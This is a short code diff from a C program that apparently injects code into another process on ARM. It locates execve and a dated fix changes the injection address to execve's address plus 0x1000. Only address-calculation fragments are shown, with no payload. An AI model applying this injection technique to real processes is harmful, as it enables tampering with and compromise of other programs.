@@ -175,8 +175,10 @@ int main(int argc, char** argv)
   //=>start is on 0x80A0
   //ARM mode
 
+/* fix galaxy@rvr.kr (2011/05/20)
   long injected_code_address = get_free_address(1);
   printf("Address for the injection: 0x%08lX.\n", injected_code_address);
+*/
 
   //nah the space on heap will be bigger
   char injected_code[0x400];
@@ -256,6 +258,11 @@ int main(int argc, char** argv)
   }
 
   printf("execve located on: 0x%08lX.\n", execve_address);
+
+// fix galaxy@rvr.kr (2011/05/20)
+  long injected_code_address = execve_address + 0x1000;
+  printf("Address for the injection: 0x%08lX.\n", injected_code_address);
+//
 
   //fill in the instructions
   //===============================================================================
